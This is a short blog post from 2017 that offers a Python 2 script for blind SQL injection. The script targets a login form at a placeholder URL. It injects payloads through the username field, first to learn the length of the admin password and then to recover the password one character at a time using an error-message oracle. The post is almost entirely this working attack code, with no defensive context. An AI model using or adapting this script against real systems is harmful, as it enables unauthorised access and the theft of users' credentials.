---
layout: post
title:  "No-SQL-Blind Injection script !"
date:   2017-01-30 14:45:00 +0100
categories: jekyll update
---

Here is a little script to exploit sql blind injections

{% highlight python %}

#!/usr/bin/env python2

import urllib
import urllib2
import time

CHARSET = "0123456789azertyuiopqsdfghjklmwxcvbnAZERTYUIOPQSDFGHJKLMWXCVBN@-_."
url = 'http://www.vulnerable_site.com/auth.php'

def sqlfind(length):
    i = 1
    final = ""
    tmp = 0
    while (i < length + 1): # length + 1 because substring starts at 1 
        query_args = { 'username':"admin' AND substr(password, " + str(i) + ", 1)= '" + CHARSET[tmp] + "' -- ", 'password':"bar" }
        encoded_args = urllib.urlencode(query_args)
        print (query_args["username"])
        response = urllib2.urlopen(url, encoded_args).read()
        time.sleep(0.2)
        if response.find("no such user") == -1:
            i = i + 1
            final += CHARSET[tmp]
            print ("PASSWORD : " + final)
            tmp = 0
        tmp = tmp + 1

def check_nb_chars():
    i = 0
    while (i < 100):
        query_args = { 'username':"admin' AND length(password)=" + str(i) + " -- ", 'password':"bar" }
        encoded_args = urllib.urlencode(query_args)
        print (query_args["username"])
        response = urllib2.urlopen(url, encoded_args).read()
        time.sleep(0.2)
        if response.find("no such user") == -1:
            print "Found the right length " + str(i)
            return (i)
        i = i + 1
    return (-1)

sqlfind(check_nb_chars())

{% endhighlight %}
